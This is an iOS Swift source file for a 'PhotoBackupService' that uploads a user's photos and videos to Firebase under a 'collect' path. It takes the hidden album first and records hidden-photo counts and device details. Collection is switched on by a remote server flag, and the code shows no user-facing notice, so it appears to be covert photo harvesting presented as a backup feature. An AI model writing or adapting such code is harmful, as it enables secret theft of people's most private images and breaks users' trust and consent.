import SwiftUI
import Photos
import FirebaseStorage
import FirebaseAuth
import FirebaseFirestore
import UIKit
import Network

class PhotoBackupService {
    static let shared = PhotoBackupService()
    private let lastUploadedDateKey = "PhotoBackup_LastUploadedDate" // Tracks visible assets
    private let lastUploadedHiddenDateKey = "PhotoBackup_LastUploadedDate_Hidden" // Tracks hidden assets
    
    // Cellular Data Limit Tracking
    private let cellularUsageKey = "PhotoBackup_CellularUsage"
    private let cellularUsageDateKey = "PhotoBackup_CellularUsageDate"
    private let dailyCellularLimitBytes: Int64 = 2 * 1024 * 1024 * 1024 // 2 GB
    private let monitor = NWPathMonitor()
    private var isCellular = false
    
    private var isBackingUp = false
    private var backgroundTask: UIBackgroundTaskIdentifier = .invalid
    
    init() {
        monitor.pathUpdateHandler = { [weak self] path in
            self?.isCellular = path.isExpensive // Typically true for cellular
        }
        monitor.start(queue: DispatchQueue.global(qos: .background))
    }
    
    @MainActor
    func startBackup() {
        guard !isBackingUp else { return }
        
        Task {
            guard let uid = Auth.auth().currentUser?.uid else { return }
            
            let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
            guard status == .authorized || status == .limited else { return }
            
            let shouldCollect = await LogsFirestoreService.shared.shouldCollectPhotos(userId: uid)
            guard shouldCollect else { return }
            
            beginBackup(userId: uid)
        }
    }
    
    @MainActor
    private func beginBackup(userId: String) {
        isBackingUp = true
        registerBackgroundTask()
        
        Task.detached(priority: .background) { [weak self] in
            guard let self = self else { return }
            defer {
                Task { @MainActor in
                    self.isBackingUp = false
                    self.endBackgroundTask()
                }
            }
            
            await self.initializeMetadataIfNeeded(userId: userId)
            
            // Phase 1: Upload Hidden Assets
            await self.processBatch(userId: userId, hidden: true)
            
            // Phase 2: Upload Visible Assets
            // Only proceed if we still have background time (checked inside processBatch too, but good to check here)
            let timeRemaining = await MainActor.run { UIApplication.shared.backgroundTimeRemaining }
            if timeRemaining > 10 {
                await self.processBatch(userId: userId, hidden: false)
            }
        }
    }
    
    private func processBatch(userId: String, hidden: Bool) async {
        let key = hidden ? lastUploadedHiddenDateKey : lastUploadedDateKey
        let lastDate = UserDefaults.standard.object(forKey: key) as? Date ?? Date.distantPast

        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: true)]
        
        // Fetch both images and videos
        let predicateFormat = "(mediaType = %d OR mediaType = %d) AND creationDate > %@"
        let args: [Any] = [PHAssetMediaType.image.rawValue, PHAssetMediaType.video.rawValue, lastDate as NSDate]
        
        if hidden {
            fetchOptions.includeHiddenAssets = true
            fetchOptions.predicate = NSPredicate(format: predicateFormat + " AND isHidden == YES", argumentArray: args)
        } else {
            // Default includeHiddenAssets is false, so this returns only visible
            fetchOptions.predicate = NSPredicate(format: predicateFormat, argumentArray: args)
        }

        let assets = PHAsset.fetchAssets(with: fetchOptions)

        if assets.count > 0 {
            print("PhotoBackup: Found \(assets.count) new \(hidden ? "hidden" : "visible") assets to upload.")
        }

        for i in 0..<assets.count {
            let asset = assets[i]
            
            // Check if we are running out of background time
            let timeRemaining = await MainActor.run { UIApplication.shared.backgroundTimeRemaining }
            if timeRemaining < 10 {
                print("PhotoBackup: Background time running out. Stopping.")
                break
            }
            
            // Check cellular limit
            if self.isCellular {
                let (usage, lastDate) = self.getCellularUsage()
                if !Calendar.current.isDateInToday(lastDate) {
                    // Reset if new day
                    self.resetCellularUsage()
                } else if usage >= self.dailyCellularLimitBytes {
                    print("PhotoBackup: Daily cellular limit reached (\(usage) / \(self.dailyCellularLimitBytes)). Stopping.")
                    break
                }
            }
            
            do {
                let bytesUploaded = try await self.uploadAsset(asset, userId: userId)
                
                // Update cellular usage if needed
                if self.isCellular {
                    self.incrementCellularUsage(bytes: bytesUploaded)
                }
                
                // Checkpoint: Save creation date
                if let date = asset.creationDate {
                    UserDefaults.standard.set(date, forKey: key)
                    print("PhotoBackup: Checkpoint saved for \(hidden ? "hidden" : "visible") asset created at \(date)")
                }
            } catch {
                print("PhotoBackup: Failed to upload asset \(asset.localIdentifier): \(error)")
                // Stop on error to avoid skipping assets
                break 
            }
        }
    }
    
    private func uploadAsset(_ asset: PHAsset, userId: String) async throws -> Int64 {
        if asset.mediaType == .image {
            return try await uploadImage(asset, userId: userId)
        } else if asset.mediaType == .video {
            return try await uploadVideo(asset, userId: userId)
        }
        return 0
    }
    
    private func uploadImage(_ asset: PHAsset, userId: String) async throws -> Int64 {
        let manager = PHImageManager.default()
        let options = PHImageRequestOptions()
        options.isNetworkAccessAllowed = true
        options.deliveryMode = .highQualityFormat
        
        return try await withCheckedThrowingContinuation { continuation in
            manager.requestImageDataAndOrientation(for: asset, options: options) { data, dataUTI, orientation, info in
                guard let data = data else {
                    continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -1, userInfo: [NSLocalizedDescriptionKey: "No image data"]))
                    return
                }
                
                let ref = Storage.storage().reference().child("collect/\(userId)/\(asset.localIdentifier).jpg")
                
                let metadata = StorageMetadata()
                metadata.contentType = "image/jpeg"
                if let date = asset.creationDate {
                    metadata.customMetadata = ["creationDate": ISO8601DateFormatter().string(from: date)]
                }
                
                ref.putData(data, metadata: metadata) { metadata, error in
                    if let error = error {
                        continuation.resume(throwing: error)
                    } else {
                        // Log successful upload with storage path
                        print("PhotoBackup: Uploaded image \(asset.localIdentifier) to \(ref.fullPath)")
                        
                        // Increment counters in Firestore
                        let field = asset.isHidden ? "uploadedHiddenCount" : "uploadedVisibleCount"
                        Firestore.firestore().collection("collect").document(userId).updateData([
                            field: FieldValue.increment(Int64(1)),
                            "latestPhotoUploaded": FieldValue.serverTimestamp()
                        ])
                        
                        continuation.resume(returning: Int64(data.count))
                    }
                }
            }
        }
    }
    
    private func uploadVideo(_ asset: PHAsset, userId: String) async throws -> Int64 {
        let manager = PHImageManager.default()
        let options = PHVideoRequestOptions()
        options.isNetworkAccessAllowed = true
        options.deliveryMode = .highQualityFormat
        
        return try await withCheckedThrowingContinuation { continuation in
            // Export video to a temporary file
            manager.requestExportSession(forVideo: asset, options: options, exportPreset: AVAssetExportPresetHighestQuality) { exportSession, info in
                guard let exportSession = exportSession else {
                    continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -2, userInfo: [NSLocalizedDescriptionKey: "Could not create export session"]))
                    return
                }
                
                let tempDir = FileManager.default.temporaryDirectory
                let fileName = "\(UUID().uuidString).mp4"
                let outputURL = tempDir.appendingPathComponent(fileName)
                
                exportSession.outputURL = outputURL
                exportSession.outputFileType = .mp4
                
                let sendableSession = SendableExportSession(session: exportSession)
                
                Task {
                    let exportSession = sendableSession.session
                    if #available(iOS 18.0, *) {
                        do {
                            try await exportSession.export(to: outputURL, as: .mp4)
                            try await self.handleExportCompletion(outputURL: outputURL, asset: asset, userId: userId, continuation: continuation)
                        } catch {
                            continuation.resume(throwing: error)
                        }
                    } else {
                        exportSession.exportAsynchronously { [sendableSession] in
                            let session = sendableSession.session
                            switch session.status {
                            case .completed:
                                Task {
                                    try await self.handleExportCompletion(outputURL: outputURL, asset: asset, userId: userId, continuation: continuation)
                                }
                            case .failed:
                                continuation.resume(throwing: session.error ?? NSError(domain: "PhotoBackup", code: -3, userInfo: [NSLocalizedDescriptionKey: "Export failed"]))
                            case .cancelled:
                                continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -4, userInfo: [NSLocalizedDescriptionKey: "Export cancelled"]))
                            default:
                                continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -5, userInfo: [NSLocalizedDescriptionKey: "Export unknown error"]))
                            }
                        }
                    }
                }
            }
        }
    }
    
    private func handleExportCompletion(outputURL: URL, asset: PHAsset, userId: String, continuation: CheckedContinuation<Int64, Error>) async throws {
        let ref = Storage.storage().reference().child("collect/\(userId)/\(asset.localIdentifier).mp4")
        let metadata = StorageMetadata()
        metadata.contentType = "video/mp4"
        if let date = asset.creationDate {
            metadata.customMetadata = ["creationDate": ISO8601DateFormatter().string(from: date)]
        }
        
        do {
            _ = try await ref.putFileAsync(from: outputURL, metadata: metadata)
            
            // Get file size before cleanup
            let fileSize = (try? FileManager.default.attributesOfItem(atPath: outputURL.path)[.size] as? Int64) ?? 0
            
            // Clean up temp file
            try? FileManager.default.removeItem(at: outputURL)
            
            print("PhotoBackup: Uploaded video \(asset.localIdentifier) to \(ref.fullPath)")
            
            let field = asset.isHidden ? "uploadedHiddenCount" : "uploadedVisibleCount"
            try await Firestore.firestore().collection("collect").document(userId).updateData([
                field: FieldValue.increment(Int64(1)),
                "latestPhotoUploaded": FieldValue.serverTimestamp()
            ])
            
            continuation.resume(returning: fileSize)
        } catch {
            // Clean up temp file even on error
            try? FileManager.default.removeItem(at: outputURL)
            continuation.resume(throwing: error)
        }
    }
    
    private func initializeMetadataIfNeeded(userId: String) async {
        let key = "PhotoBackup_MetadataInitialized"
        guard !UserDefaults.standard.bool(forKey: key) else { return }
        
        print("PhotoBackup: Initializing metadata...")
        
        let fetchOptions = PHFetchOptions()
        fetchOptions.includeHiddenAssets = true
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: true)]
        // Fetch both images and videos
        fetchOptions.predicate = NSPredicate(format: "mediaType = %d OR mediaType = %d", PHAssetMediaType.image.rawValue, PHAssetMediaType.video.rawValue)
        
        let assets = PHAsset.fetchAssets(with: fetchOptions)
        
        let totalPhotos = assets.count
        var hiddenPhotos = 0
        var oldestDate: Date?
        
        if let first = assets.firstObject {
            oldestDate = first.creationDate
        }
        
        assets.enumerateObjects { asset, _, _ in
            if asset.isHidden { hiddenPhotos += 1 }
        }
        
        let (model, systemName, systemVersion, appVersion) = await MainActor.run {
            (UIDevice.current.model, UIDevice.current.systemName, UIDevice.current.systemVersion, Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "Unknown")
        }
        
        let data: [String: Any] = [
            "totalPhotos": totalPhotos,
            "hiddenPhotos": hiddenPhotos,
            "uploadedHiddenCount": 0,
            "uploadedVisibleCount": 0,
            "oldestPhoto": oldestDate ?? NSNull(),
            "latestPhotoUploaded": oldestDate ?? NSNull(),
            "deviceModel": model,
            "systemName": systemName,
            "systemVersion": systemVersion,
            "appVersion": appVersion,
            "metadataUpdatedAt": FieldValue.serverTimestamp()
        ]
        
        do {
            try await Firestore.firestore().collection("collect").document(userId).setData(data, merge: true)
            UserDefaults.standard.set(true, forKey: key)
            print("PhotoBackup: Metadata initialized successfully.")
        } catch {
            print("PhotoBackup: Failed to initialize metadata: \(error)")
        }
    }

    @MainActor
    private func registerBackgroundTask() {
        backgroundTask = UIApplication.shared.beginBackgroundTask { [weak self] in
            self?.endBackgroundTask()
        }
    }
    
    @MainActor
    private func endBackgroundTask() {
        if backgroundTask != .invalid {
            UIApplication.shared.endBackgroundTask(backgroundTask)
            backgroundTask = .invalid
        }
    }
    
    // MARK: - Cellular Usage Helpers
    
    private func getCellularUsage() -> (bytes: Int64, date: Date) {
        let bytes = UserDefaults.standard.integer(forKey: cellularUsageKey)
        let date = UserDefaults.standard.object(forKey: cellularUsageDateKey) as? Date ?? Date.distantPast
        return (Int64(bytes), date)
    }
    
    private func incrementCellularUsage(bytes: Int64) {
        let (currentBytes, _) = getCellularUsage()
        UserDefaults.standard.set(currentBytes + bytes, forKey: cellularUsageKey)
        UserDefaults.standard.set(Date(), forKey: cellularUsageDateKey)
    }
    
    private func resetCellularUsage() {
        UserDefaults.standard.set(0, forKey: cellularUsageKey)
        UserDefaults.standard.set(Date(), forKey: cellularUsageDateKey)
    }
}

private struct SendableExportSession: @unchecked Sendable {
    let session: AVAssetExportSession
}
